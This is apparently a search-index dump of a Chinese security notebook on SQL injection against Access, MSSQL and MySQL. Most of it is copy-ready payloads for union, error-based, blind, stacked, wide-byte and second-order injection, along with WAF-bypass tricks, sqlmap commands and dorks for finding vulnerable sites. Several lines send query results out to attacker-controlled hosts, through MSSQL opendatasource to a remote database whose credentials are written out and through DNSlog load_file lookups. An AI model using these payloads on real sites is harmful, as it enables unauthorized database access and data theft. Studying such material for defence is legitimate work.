"},"NoteBook/SQL注入/Access数据库/偏移注入.html":{"url":"NoteBook/SQL注入/Access数据库/偏移注入.html","title":"偏移注入","keywords":"","body":"偏移注入 当知道表名不知道字段名的情况下使用偏移注入 因为sql注入是查询网站写好的数据表，想要注入别的数据表必须字段数相同，或者想要查询的数据表的字段小于当前查询的数据表的字段 表名.*代表这个数据表里面的所有数据 order by有12个字段 union select 1,2,3,4,5,6,7,8,9,10,11,12 from admin 想要注入的admin表有6个字段 union select 1,2,3,admin.*,10,11,12 from admin "},"NoteBook/SQL注入/Access数据库/Cookie注入.html":{"url":"NoteBook/SQL注入/Access数据库/Cookie注入.html","title":"Cookie注入","keywords":"","body":"Cookie注入 什么是Cookie Cookie就是代表身份的一串字符串，网站根据Cookie来识别你是谁，如果你获取了管理员的Cookie，无需密码就可以登录管理员帐号 什么是Cookie注入 开发的偷懒，无论什么数据都用$_REQUEST来获取，这就有可能忽略了对Cookie传参的检测，也可以通过这个绕过waf 注意：php5.4以上的版本就不会接受Cookie传参了 流程 尝试cookie传入参数和值是否可以运行 猜字段数（order by） 猜表名 猜字段（字段名） 方法 插件修改 EditThisCookie 通过“+”来添加cookie字段（可能get传参有waf拦截） 修改数据来进行注入 JS修改 document.cookie=\"参数\"+escape(\"值\") sqlmap跑 python3 sqlmap.py -u \"http://127.0.0.1/1.asp\" --cookie \"id=1\" --level 2 "},"NoteBook/SQL注入/MssQL数据库/":{"url":"NoteBook/SQL注入/MssQL数据库/","title":"MssQL","keywords":"","body":" sysobjects【系统表】 查询用户的表select * from sysobjects where xtype='U' syscolumns【系统字段】 查询表的字段select * from syscolumns where id='用户表对应的ID' "},"NoteBook/SQL注入/MssQL数据库/反弹注入.html":{"url":"NoteBook/SQL注入/MssQL数据库/反弹注入.html","title":"反弹注入","keywords":"","body":" 让被攻击者的数据库查询的数据插入到攻击者的数据库中 需要什么？ 公网IP 服务器，数据库 反弹注入会暴露自己的公网IP 需要其他网上虚拟空间搭建数据库 无法闭合、延时注入、盲注、报错注入都失效，用到反弹注入，需要opendatasource函数 必须得配合堆叠注入 分号后面的数据库语句还可以执行 select * from admin;select * from password; 格式 insert into opendatasource('连接的组件', 'server=连接地址, 端口;uid=账号;pwd=密码;database=数据库的名字').数据库.dbo.表 select * from 查询的表 知道表内字段数 insert into opendatasource('sqloledb','server=den1.mssql7.gear.host,1433;uid=assdawqwe;pwd=Se7b77t0-!zP;database=assdawqwe').assdawqwe.dbo.mms select * from admin 不知道表内字段数一个一个反弹 insert into opendatasource('sqloledb','server=den1.mssql7.gear.host,1433;uid=assdawqwe;pwd=Se7b77t0-!zP;database=assdawqwe').assdawqwe.dbo.mms1 select name from sysobjects where xtype='U' "},"NoteBook/SQL注入/MssQL数据库/显错注入.html":{"url":"NoteBook/SQL注入/MssQL数据库/显错注入.html","title":"显错注入","keywords":"","body":" 判断注入 and 1=1 / and 1=2 是否延时：==WAITFOR DELAY '0:0:10'== 判断字段 order by n 查看显错点 MSSQL数据库和mysql数据库不同，联合查询必须是union all select查询数据是必须加上数据类型，如果不清楚就写null union all select null,null,null,null 查表 sysobjects中的name字段就是表名 union all select name where xtype = 'U'; 查字段 sysobjects中的id字段记录下来，在syscolumns中添加查询条件id=在sysobjects中查询的id结果 union all select id from sysobjects where xtype = 'U'; 查询的结果记录下来（好比id查到的结果是34） union all select * from syscolumns where id = 34; 就会得到这个数据表的所有字段 查数据 union all select null,password from admin "},"NoteBook/SQL注入/MySQL数据库/":{"url":"NoteBook/SQL注入/MySQL数据库/","title":"MySQL","keywords":"","body":"系统自带库 information_schema 存放表名和库名的对应 information_schema.tables 存放字段名表名的对应 information_schema.columns imit的用法imit的使用格式为 limit m,n，其中m是指记录开始的位置，从O开始，表示第一条记录；n是指取n条记录。例如 limit o，1表示从第一条记录开始，取一条记录，不使用 limit和使用 limit查询的结果如图4-4和图4-5所示，可以很明显地看出二者的区别。 函数名 介绍 system_user() 系统用户名 user() 用户名 current_user() 当前用户名 session_user() 链接当前数据库的用户名 @@datadir 数据库路径 @@basedir 数据库安装路径 @@version_compile_os 操作系统 count() 返回执行结果的数量 concat() 没有分隔符的连接字符串 concat_ws() 含有分隔符的连接字符串 group_concat() 连接一个组的所有字符串，以逗号分开每条数据 load_file() 读取本地文件 into outfile 写文件 ascii() 字符串的ASCII代码值 ord() 返回字符串的第一个字符的ASCII代码值 mid() 返回一个字符串的一部分 substr() 返回一个字符串的一部分 length() 返回字符串的长度 left() 返回字符串最左面的几个字符 floor() 返回小于或等于X的最大整数 char() 返回整数ASCII代码字符组成的字符串 strcmp() 比较字符串内容 ifnull() 加入参数1部位NULL，则返回为参数1，否则返回值为参数2 exp() 返回e的x次方 26、sleep()让此语句运行N秒钟 27、if() SELECT IF(1>2,2,3) ; -->3 28、char()返回整数ASCII代码字符组成的字符串 29、strcmp()比较字符串内容 30、ifnull() 假如参数1不为NULL，则返回值为参数1，否则其返回值为参数2 31exp()返回e的x次方 二、目标搜集 1、无特定目标：inurl:.php?id= 2、有特定目标：inurl:php?id= site: 3、工具爬取：spider,对搜索引擎和目标网站的链接进行爬取 三、注入识别 1、手工简单识别: ' and 1=1/and 1=2 and '1'='1/and '1'='2 and 1like 1/and 1like 2 2、工具识别： sqlmap -m filename(filename中保存检测目标) sqlmap --crawl(sqlmap对目标网站进行爬取，然后一次进行测试) 3、高级识别 扩展识别广度和深度: SqlMap --level 增加测试级别，对header中相关参数也进行测试 sqlmap -r filename(filename中为网站请求数据) 利用工具识别提高效率 BurpSuite+Sqlmap BurpSuite拦截所有浏览器访问提交的数据 BurpSuite扩展插件，直接调用SqlMap进行测试一些Tips 可以在参数后键入\"*\"来确定想要测试的参数 可能出现的点：新闻、登录、搜索、留言 站在开发的角度去寻找 四、报错注入方法 1、floor() :select count(*) from information_schema.tables group by concat((select 2、version()),floor(rand(0)*2));https://github.com/ADOOO/Dnslogsqlinj 3、group by会对rand()函数进行操作时产生错误 4、concat:连接字符串功能 5、floor:取float的整数值 6、rand:取0~1之间随机浮点值 7、group by:根据一个或多个列对结果集进行分组并有排序功能 8、extractvalue():extractvalue(1,concat(0x7e,(select user()),0x7e)); 9、updatexml():select updatexml(1,concat(0x7e,(select user()),0x7e),1); 五、布尔盲注 1、left()函数 left(database(),1)>'s' database()显示数据库名称,leȨ(a,b)从左侧截取a的前b位 2、regexp select user() regexp'^r' 正则表达式的用法user()结果为root,regexp为匹配root的正则表达式 3、like select user() like'^ro%' 与regexp类似，使用like进行匹配 4、substr()函数 ascii()函数 substr()函数 ascii(substr((select database()),1,1))<>98 substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将某个字符转换为ascii值 5、ord()函数 mid()函数 ord(mid((select user()),1,1))=114 mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii(),将字符转为ascii值 六、时间盲注 if(left(user(),1)='a',0,sleep(3)); 七、DNSlog注入 SELECT LOAD_FILE(CONCAT('\\\\',select database(),'.mysql.r4ourp.ceye.io\\abc')); 八、宽字节注入 1、在注入点后键入%df,然后按照正常的诸如流程开始注入 2、黑盒测试： 在可能的注入点后键入%df,之后进行注入测试 3、白盒测试： 查看MySql编码是否为GBK 是否使用preg_replace把单引号替换成\\' 是否使用addslashes进行转义 是否使用mysql_real_escape_string进行转义 4、防止宽字节注入 使用utf-8,避免宽字节注入 ps:不仅在gbk,韩文、日文等等都是宽字节，都很有可能存在宽字节注入漏洞 mysql_real_escape_string,mysql_set_charset('gbk',$conn); 设置参数，character_set_client=binary 九、二次编码 1、在注入点后键入%2527,然后按照正常的注入流程开始注入 2、黑盒测试： 在可能的注入点后键入%2527,之后进行注入测试 3、白盒测试 是否使用urldecode函数 urldecode函数是否存在转义方法之后 十、二次注入 1、插入恶意数据 第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，再写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。 2、引用恶意数据 在将数据存入到数据库之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了而已数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。 3、二次注入防御： 对外部提交的数据，需要更加谨慎的对待。 程序内部的数据调用，也要严格的进行检查，一旦不小心，测试者就能将特定了SQL语句带入到查询当中。 十一、WAF绕过 熟练掌握MySQL函数和语法使用方法+深入了解中间件运行处理机制+了解WAF防护原理及方法=随心所欲的绕过WAF的保护 1、白盒绕过 使用了blacklist函数过滤了'or'和'AND' 大小写变形:Or,OR,oR 等价替换：and->&&,or->|| 2、黑盒绕过 寻找源站->针对云WAF 利用同网段->绕过WAF防护区域 利用边界漏洞->绕过WAF防护区域 资源限制角度绕过WAF POST大BODY 请求方式变换GET->POST Content-Type变换：application/x-www-form-urlencoded;->multipart/form-data; 参数污染 SQL注释符绕过 Level-1:union/**/select Level-2:union/aaaa%01bbs/select Level-3:union/aaaaaaaaaaaaaaaaaaaaaaa/select 内联注释:/!xxx/ 空白符绕过 MySQL空白符：%09,%0A,%0B,%0D,%20,%0C,%A0,/XXX/ 正则的空白符:%09,%0A,%0B,%0D,%20 Example-1:union%250Cselect Example-2:union%25A0select concat%2520( concat/**/( concat%250c(http://127.0.0.1/Less/?id=1 concat%25a0( 浮点数词法解析 select * from users where id=8E0union select 1,2,3 select * from users where id=8.0union select 1,2,3 select * from users where id=\\Nunion select 1,2,3 extractvalue(1.concat(0x5c,md5(3))); updatexml(1,concat(0x5d,md5(3))),1); GeometryCollection((select*from(select@@version)f)x)) polygon((select*from(select name_const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() MySQL特殊语法 select{x table_name}from{x information_schema.tables}; 3、Fuzz绕过 注释符绕过 最基本的:union/**/select 中间引入特殊字:union/aaa%0abbs/select 最后测试注释长度:union/aaaaaaaaaaaaaaa/select 最基本的模式:union/something/select a1%!%2f 十二、sqlmap的conf sqlmap.py -v3(主函数入口) --user-agent=websecurity(请求扩充) --threads=5(访问优化) -p id注入配置 --level 3（检测配置） --technique=E(注入技术) --current-user(信息获取) --flush-session（通用设置） --beep(杂项)幕布 - 极简大纲笔记 | 一键生成思维导图 "},"NoteBook/SQL注入/MySQL数据库/Head注入.html":{"url":"NoteBook/SQL注入/MySQL数据库/Head注入.html","title":"Head注入","keywords":"","body":" 通过$_SERVER获取的数据未经过任何处理，直接插入数据库，从而形成head注入，获取数据之后就会插入数据库，所以不会有回显，显错注入无效，只能盲注或报错注入 常见的容易出Head注入的地方 Cookie $_Cookie['id'] 获取用户的cookie信息，无任何过滤 user_agent $_SERVER['HTTP_USER_ADENT'] 获取用户相关信息、包括用户浏览器、操作系统等信息 referer $_SERVER['HTTP_REFERER'] 获取Referer请求头数据 x-forwarded-for $_SERVER['REMOTE_ADDR'] 获取浏览网页的用户IP host $_SERVER['HTTP_HOST'] 请求头信息中的Host内容，获取当前域名 案例 这是一个MySQL插入语句： insert into ugaent ('useragent', 'username') values ($agent, $user); 因为 $agent 是直接通过 $_SERVER['HTTP_USER_ADENT'] 获取，没有任何防护 '' or updatexml(1,concat(ox7e, (select database())),1),1)# 后面的 ,1 是因为前面插入了两个数据，这里也需要两个数据来保持一致 "},"NoteBook/SQL注入/MySQL数据库/显错注入.html":{"url":"NoteBook/SQL注入/MySQL数据库/显错注入.html","title":"显错注入","keywords":"","body":"代码分析 \" ?> 当访问id = 1 union select 1, 2, 3时，执行的SQL语句是 ==select * from users where 'id' = 1== 和 ==union select 1, 2, 3== 两条SQL语句 基本流程 你原有的代码想要篡改掉显示你想要的一个数据 是否存在注入点 ' -- qwe \" -- qwe ') -- qwe \") -- qwe 利用 and 1=1 和 and 1=2 来查看报错显示 or sleep(n)(延时) 猜字段名 ?id=1 ' union select order by n -- 123 寻找输出点 ?id=1 ' union select 1,2,3,4,5 -- 123 查询数据库、数据表、数据 ?id=1 ' union select database(),user() -- 123 ?id=1 ' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- 123 ?id=1 ' union select 1,group_concat(column_name) from information_schema.columns where table_name='表名' -- 123 ?id=1 ' union select 1,group_concat(username,password) from amdin # 特殊情况 存在注入点但是输出点的语句无法执行？ 可能是因为只执行了前面的语句，想办法让前面的语句报错，例如：==?id=1.1 'union select 1,2 -- 123或者?id=1 ' and 1=2 union select 1,2 -- 123==+ "},"NoteBook/SQL注入/MySQL数据库/base64注入.html":{"url":"NoteBook/SQL注入/MySQL数据库/base64注入.html","title":"base64注入","keywords":"","body":"代码分析 \"; echo \"Name : \" . $row['username'] . \"\"; echo \"PassWd : \" . $row['passwd'] . \"\"; echo \"\"; } mysql_close($con); echo \"now use\" . $sql . \"\"; ?> 程序获取GET传参的ID，利用base64_decode()函数对参数进行base64解码，然后将解码后的$id拼接到select查询语句中进行查询，通过while循环将查询结果输出到页面 由于代码没有对解码后SQL语句无任何过滤，当访问id=1 union select 1,2,3#【访问时，先进性base64加密】，此时的SQL语句为select * from users where id=1和union select 1,2,3# 可以尝试绕过WAF【对传参进行base64编码】 "},"NoteBook/SQL注入/MySQL数据库/DNSLog注入.html":{"url":"NoteBook/SQL注入/MySQL数据库/DNSLog注入.html","title":"DNSLog注入","keywords":"","body":" DNS日志注入（将于域名转换为IP） 默认Linux上不能使用，Linux没有SMB服务 使用场景 在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这个时候就可以通过DNS请求把数据外带出来，对于SQL盲注，常见的方法就是二分猜解，很麻烦，也很容易请求过多导致被ban，所以可以将select到的数据发送给一个url，利用DNS解析产生的日志查看数据，也就是将盲注转换成显错注入 函数 load_file() 读取文件并返回内容为字符串 文件必须位于服务器主机上，必须制定完整路径的文件 load_file的开启 mysql.ini中添加secure_file_priv= UNC路径 UNC路径就是Windows有个叫SMB的服务 //abc.com/abc 就是访问abc.com下的abc共享文件夹 注入 数据库 ?id=1 and load_file(concat(‘//‘,(select database()),’.cpdvs2.dnslog.cn/abc’)) 数据表 ?id=1 and load_file(concat(‘//‘,(select table_name from information_schema.tables where table_schema=database() limit 0,1),’.cpdvs2.dnslog.cn/abc’)) 字段 ?id=1 and load_file(concat(‘//‘,(select column_name from information_schema.colmuns where table_name='表名' limit 0,1),’.cpdvs2.dnslog.cn/abc’)) 数据 ?id=1 and load_file(concat(‘//‘,(select 字段名 from 表名 limit 0,1),’.nyoi6t.dnslog.cn/abc’)) "},"NoteBook/SQL注入/MySQL数据库/报错注入.html":{"url":"NoteBook/SQL注入/MySQL数据库/报错注入.html","title":"报错注入","keywords":"","body":"代码分析 输入 ==username=1'== 时，SQL语句为select * from users where 'username'='1''，执行时会因为多了一个单引号报错，可以利用这种报错进行注入 利用特殊的语句，让原有的语句出现致命性错误，返回的错误信息中含有你想要的数据 updatexml updatexml(目标xml内容, xml文档路径, 更新的内容) 实际上就是去更新XML文档，但是我们在XML文档的路径的位置里面写入子查询，通过输入特殊字符，文档路径不符合规矩进行报错，报错的时候就已经在执行那个子查询了， 主要目的是让xml的文档路径报错，所以xml的内容和更新的内容可以随便写，如多谢字符串要加单引号 想要让路径报错，必须得加上特殊符号或者16进制格式的特殊符号，然后拼接到一起（concat函数就是拼接多个字符串在一起） 完整语句：'' or updatexml(1,concat(0x73, (select database())),2)# (这里or不行试一试and)` `ERROR 1105 (HY000): XPATH syntax error: '~test'这样就报错出了库名 extractvalue 查询内容 extractvalue(目标xml文档，xml路径) 和updatexml一样，就是参数不一样，用法完全一样 MySQL的报错SQL注入方法 MySQL的报错SQL注入方法 多数人以为只有三种 实际上还有很多个函数都会导致MySQL报错并且显示出数据 利用这种类型来说明利用 多数人以为只有三种 floor() updatexml() extractvalue() 实际上还有很多个函数都会导致MySQL报错并且显示出数据 GeometryCollection() polygon() 3 GTID_SUBSET() multipoint() multilinestring() multipolygon() LINESTRING() exp() 这些方法并不是在所有版本都通用，也有比较老的版本没有这些函数 通常注入的SQL语句大多是\"select * from phpsec where id=?\" 这种类型 利用这种类型来说明利用 第一种：floor() 注入语句： id=1 and (select 1 from (select count(),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a) 例如： http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; and (select 1 from (select count(),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a) --+ http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; and (select 1 from (select count(),concat((select (select (select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) --+ http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; and (select 1 from (select count(),concat((select (select (select concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) --+ 通过floor报错【没有任何字符长度限制】 固定句式： and (select 1 from (select count(),concat((select (select (payload)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) 查询数据库的个数： select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata payload组合语句： and (select 1 from (select count(),concat((select (select (select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) 获取数据库名字： select concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 0,1 payload组合语句： and (select 1 from (select count(),concat((select (select (select concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 第二种：extractvalue() 注入语句： id=1 and (extractvalue(1,concat(0x5c,(select user())))) 例如： http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; and (extractvalue(1,concat(0x5c,(select user())))) --+ http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; and extractvalue(1,(concat(0x7e,(select @@version),0x7e))) --+ http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; and extractvalue(1,(concat(0x7e,(select version()),0x7e))) --+ 通过ExtractValue报错【最多32字符】 固定句式： and extractvalue(1,(payload)) 或者记忆成： and extractvalue(1,(concat(0x7e,(payload),0x7e))) 查询数据库版本号： and extractvalue(1,(concat(0x7e,(select @@version),0x7e))) 或者写成： and extractvalue(1,(concat(0x7e,(select version()),0x7e))) 第三种：updatexml() 注入语句： id=1 AND (updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) 例如： http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; AND (updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) --+ http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; +and updatexml(1,(concat(0x7e,(select @@version),0x7e)),1) --+ http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; +and updatexml(1,(concat(0x7e,(select version()),0x7e)),1) --+ 通过UpdateXML报错【最多32字符】 固定句式： +and updatexml(1,(payload),1) 或者记忆成： +and updatexml(1,(concat(0x7e,(payload),0x7e)),1) 查询数据库版本号： +and updatexml(1,(concat(0x7e,(select @@version),0x7e)),1) 或者写成： +and updatexml(1,(concat(0x7e,(select version()),0x7e)),1) +加号可以换成空格 第四种：GeometryCollection()【高版本数据库并没有执行成功】 注入语句： id=1 AND GeometryCollection((select from (select from (select user())a)b)) 例如： http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; AND GeometryCollection((select from (select from (select user())a)b)) --+ 第五种：polygon()【高版本数据库并没有执行成功】 注入语句： id=1 AND polygon((select from (select from (select user())a)b)) 例如： http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; AND polygon((select from (select from (select user())a)b)) --+ 第六种：multipoint()【高版本数据库并没有执行成功】 注入语句： id=1 AND multipoint((select from (select from (select user())a)b)) 例如： http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; AND multipoint((select from (select from (select user())a)b)) --+ 第七种：multilinestring()【高版本数据库并没有执行成功】 注入语句： id=1 AND multilinestring((select from (select from (select user())a)b)) 例如： http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; AND multilinestring((select from (select from (select user())a)b)) --+ 第八种：multipolygon()【高版本数据库并没有执行成功】 注入语句： id=1 AND multipolygon((select from (select from (select user())a)b)) 例如： http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; AND multipolygon((select from (select from (select user())a)b)) --+ 第九种：linestring()【高版本数据库并没有执行成功】 注入语句： id=1 AND LINESTRING((select from (select from (select user())a)b)) 例如： http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; AND LINESTRING((select from (select from (select user())a)b)) --+ 第十种：exp()【高版本数据库并没有执行成功】 注入语句： id=1 and EXP(~(SELECT from (SELECT user())a)) 例如： http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&#39; and EXP(~(SELECT from (SELECT user())a)) --+ "},"NoteBook/SQL注入/MySQL数据库/布尔盲注.html":{"url":"NoteBook/SQL注入/MySQL数据库/布尔盲注.html","title":"布尔盲注","keywords":"","body":"代码分析 当访问 ==id=1' or 1=1 -- 123== 时，数据库的执行语句为==select * from users where 'id'='1' or 1=1 -- 123'==，由于 or 1=1是真条件，所以返回真【yes】 当访问 ==id=1' and 1=2 -- 123==时，数据库的执行语句为==select * from users where 'id'='1' and 1=2 -- 123'==，由于 and 1=2是假条件，所以返回假【no】 布尔盲注很明显结果是True和False，也就是说它只会根据你的注入信息返回True或False，就没有了之前的报错信息 函数 length() : 返回字符串的长度 left(a, b) : 从左侧截取 a 的前 b 位 substr(str, pos, len) : 截取字符串 count() : 查看数据的个数 ascii() : 返回字符的ascii位 流程 graph LR; 报错注入 --> 判断是否存在注入; 判断是否存在注入 --> 查询数据库; 查询数据库 -->查询数据表; 查询数据表 --> 查询字段名; 查询字段名 --> 查询数据; graph TD; 查询库名 --> 数据库长度; 查询库名 --> 数据库名; 查数据表 --> 数据表个数; 查数据表 --> 每个表长度; 查数据表 --> 每个数据表; graph TD; 查字段 --> 字段个数; 查字段 --> 每个字段长度; 查字段 --> 每个字段名;; 查数据 --> 数据个数; 查数据 --> 每个数据长度; 查数据 --> 每个数据; 判断是否存在注入 ?id=1 and 1=1 ?id=1 and 1=2 流程 数据库 查看数据库的长度 ?id = 1 and length(database()) = 12 查看数据库 ?id=1 and left(database(),1) = 'k' ?id=1 and left(database(),2) = 'ka' ………… ?id=1 and left(database(),12) = 'kanwolongxia' 数据表 查看当前数据库有多少个数据表 ?id=1 and (select count(table_name) from information_schema.tables where table_schema=database())=n // n是用来代替哟普多少个表 查看表名长度 第一个表的长度 ?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 第二个表长度 ?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4 表名 第一个表名 ?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) = ascii的字符数字 ……………… ?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),6,1)) = ascii的字符数字 第二个表名 ?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 1,1),1,1)) = ascii的字符数字 ………… ?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 1,1),4,1)) = ascii的字符数字 数据字段 字段名的个数 第一个表字段个数 ?id=1 and (select count(column_name) from information_schema.columns where table_name='第一个表名') = 个数 第二个表字段个数 ?id=1 and (select count(column_name) from information_schema.columns where table_name='第二个表名') = 个数 字段名长度 第一个表 第一个字段长度 : ?id=1 and length(substr((select column_name from information_schema.columns where table_name='第一个表名' limit 0,1),1)) = 长度 第二个字段长度 : ?id=1 and length(substr((select column_name from information_schema.columns where table_name='第一个表名' limit 1,1),1)) = 长度 第二个表名 第一个字段名长度 : ?id=1 and length(substr((select column_name from information_schema.columns where table_name='第二个表名' limit 0,1),1)) = 长度 第二个字段名长度 : ?id=1 and length(substr((select column_name from information_schema.columns where table_name='第二个表名' limit 1,1),1)) = 长度 字段名 第一个表 第一个字段名 : ?id=1 and ascii(substr((select column_name from information_schema.columns where table_name = '第一个表名' limit 0,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select column_name from information_schema.columns where table_name = '第一个表名' limit 0,1),2,1)) = ascii的字符数字 第二个字段名 : ?id=1 and ascii(substr((select column_name from information_schema.columns where table_name = '第一个表名' limit 1,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select column_name from information_schema.columns where table_name = '第一个表名' limit 1,1),2,1)) = ascii的字符数字 第二个表 第一个字段名 : ?id=1 and ascii(substr((select column_name from information_schema.columns where table_name = '第二个表名' limit 0,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select column_name from information_schema.columns where table_name = '第二个表名' limit 0,1),2,1)) = ascii的字符数字 第二个字段名 : ?id=1 and ascii(substr((select column_name from information_schema.columns where table_name = '第二个表名' limit 1,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select column_name from information_schema.columns where table_name = '第二个表名' limit 1,1),2,1)) = ascii的字符数字 数据 数据个数 第一个表 第一个字段里的数据个数 : ?id=1 and (select count(第一个字段) from 第一个表) = 个数 第二个字段里面的数据个数 : ?id=1 and (select count(第二个字段) from 第一个表) = 个数 第二个表 第一个字段里面的数据个数 : ?id=1 and (select count(第一个字段) from 第二个表) = 个数 第二个字段里面的数据个数 : ?id=1 and (select count(第二个字段) from 第二个表) = 个数 数据长度 第一个表 第一个字段 第一个数据长度 : ?id=1 and (select length(第一个字段) from 第一个表 limit 0,1) = 长度 第二个数据长度 : ?id=1 and (select length(第一个字段) from 第一个表 limit 1,1) = 长度 第二个字段 第一个数据长度 : ?id=1 and (select length(第二个字段) from 第一个表 limit 0,1) = 长度 第二个数据长度 : ?id=1 and (select length(第二个字段) from 第一个表 limit 1,1) = 长度 第二个表 第一个字段 第一个数据长度 : ?id=1 and (select length(第一个字段) from 第二个表 limit 0,1) = 长度 第二个数据长度 : ?id=1 and (select length(第一个字段) from 第二个表 limit 1,1) = 长度 第二个字段 第一个数据长度 : ?id=1 and (select length(第二个字段) from 第二个表 limit 0,1) = 长度 第二个数据长度 : ?id=1 and (select length(第二个字段) from 第二个表 limit 1,1) = 长度 数据 第一个表 第一个字段 第一个数据 : ?id=1 and ascii(substr((select 第一个字段 from 第一个表 limit 0,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select 第一个字段 from 第一个表 limit 0,1),2,1)) = ascii的字符数字 第二个数据 : ?id=1 and ascii(substr((select 第一个字段 from 第一个表 limit 1,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select 第一个字段 from 第一个表 limit 1,1),2,1)) = ascii的字符数字 第二个字段 第一个数据 : ?id=1 and ascii(substr((select 第二个字段 from 第一个表 limit 0,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select 第二个字段 from 第一个表 limit 0,1),2,1)) = ascii的字符数字 第二个数据 : ?id=1 and ascii(substr((select 第二个字段 from 第一个表 limit 1,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select 第二个字段 from 第一个表 limit 1,1),2,1)) = ascii的字符数字 第二个表 第一个字段 第一个数据 : ?id=1 and ascii(substr((select 第一个字段 from 第二个表 limit 0,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select 第一个字段 from 第二个表 limit 0,1),2,1)) = ascii的字符数字 第二个数据 : ?id=1 and ascii(substr((select 第一个字段 from 第二个表 limit 1,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select 第一个字段 from 第二个表 limit 0,1),2,1)) = ascii的字符数字 第二个字段 第一个数据 : ?id=1 and ascii(substr((select 第二个字段 from 第二个表 limit 0,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select 第二个字段 from 第二个表 limit 0,1),2,1)) = ascii的字符数字 第二个数据 : ?id=1 and ascii(substr((select 第二个字段 from 第二个表 limit 1,1),1,1)) = ascii的字符数字 ?id=1 and ascii(substr((select 第二个字段 from 第二个表 limit 0,1),2,1)) = ascii的字符数字 "},"NoteBook/SQL注入/MySQL数据库/堆叠查询.html":{"url":"NoteBook/SQL注入/MySQL数据库/堆叠查询.html","title":"堆叠查询","keywords":"","body":" 堆叠查询可以执行多条SQL语句，语句之间用 ; 隔开 先访问id=1'查看页面是否会报错 在访问id=1' %23，页面返回正常也已使用布尔盲注 延时注入 ，也可以使用堆叠注入 完整的SQL注入语句';select if(substr(select table_name from information_schema.tables where table_schema=database limit 0,1),1, 1)='e', sleep(3), 1)%23 代码分析 在堆叠注入中程序获取的是GET传参的id，使用PDO的方式进行数据查询，但仍然将参数ID拼接到查询语句中，导致PDO没起到预编译的作用，程序扔存在SQL注入 setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); $stmt = $conn -> query(\"select * from users where 'id' = '\" . $GET['id'] . \"'\"); $result = $stmt -> setFetchMode(PDO::FETCH_ASSOC); foreach($stmt -> fetchall() as $k => $v) { foreach ($v as $key => $value){ echo $value; } } $dsn = null; } catch(PDOException $e){ echo \"error\"; } $conn = null; ?> 使用PDO执行SQL语句时，可以执行多条，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果，所以在第二条语句中使用update更新数据或者延时盲注获取数据 访问1.php?id=1';select if(ord(substr(select table_name from information_schema.tables where table_schema=database limit 0,1),1, 1)='e', 1, 1), sleep(3), 1)%23，执行的SQL语句为 select * from users where 'id'='1';select if(ord(substr(select table_name from information_schema where table_schema=database())='a', 1, 1), sleep(3), 1)%23' 分号前后代表两条数据 select * from users where 'id'='1'; select if(ord(substr(select table_name from information_schema where table_schema=database())='a', 1, 1), sleep(3), 1)%23' "},"NoteBook/SQL注入/MySQL数据库/二次注入.html":{"url":"NoteBook/SQL注入/MySQL数据库/二次注入.html","title":"二次注入","keywords":"","body":" 1.php是注册用户【插入SQL语句的地方】 2.php通过ID参数读取用户和用户信息 